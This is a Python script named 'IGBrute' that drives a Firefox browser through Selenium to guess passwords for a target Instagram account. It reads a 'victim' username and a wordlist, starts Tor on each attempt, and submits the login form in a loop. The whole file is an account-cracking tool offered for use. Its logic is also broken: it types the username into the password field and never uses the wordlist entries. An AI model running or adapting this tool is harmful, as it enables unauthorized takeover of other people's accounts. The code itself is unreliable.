from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from colorama import Fore
from pyfiglet import Figlet
import os
import pyautogui
import time as t

fig = Figlet(font="block")
print(Fore.RED + fig.renderText("IGBrute"))

b = webdriver.Firefox(executable_path="//path/to/gecko/driver")

victim = input(Fore.YELLOW + "[*] Target username: ")
passlist = input(Fore.YELLOW + "[*] Wordlist: ")
passlist = open(passlist, "r")

timeout = int(input(Fore.YELLOW + "\n[*] Timeout between each password (Secs): "))
print(Fore.YELLOW + "[-] Please wait for a moment")
t.sleep(2)

for password in passlist:
	os.system("service tor start")

	b.get("https://www.instagram.com")
	print(Fore.GREEN + "Trying password [%s]" % password)
	t.sleep(timeout)

	username = b.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[2]/div/label/input')
	username.click()
	username.send_keys(victim)
	password = b.find_element_by_xpath('//*[@id="react-root"]/section/main/article/div[2]/div[1]/div/form/div[3]/div/label/input')
	password.click()
	password.send_keys(victim)

	login = b.find_element_by_xpath("/html/body/div[1]/section/main/article/div[2]/div[1]/div/form/div[4]/button")
	login.click()
	password.click()

	pyautogui.hotkey("ctrl", "a")
	pyautogui.press("backspace")
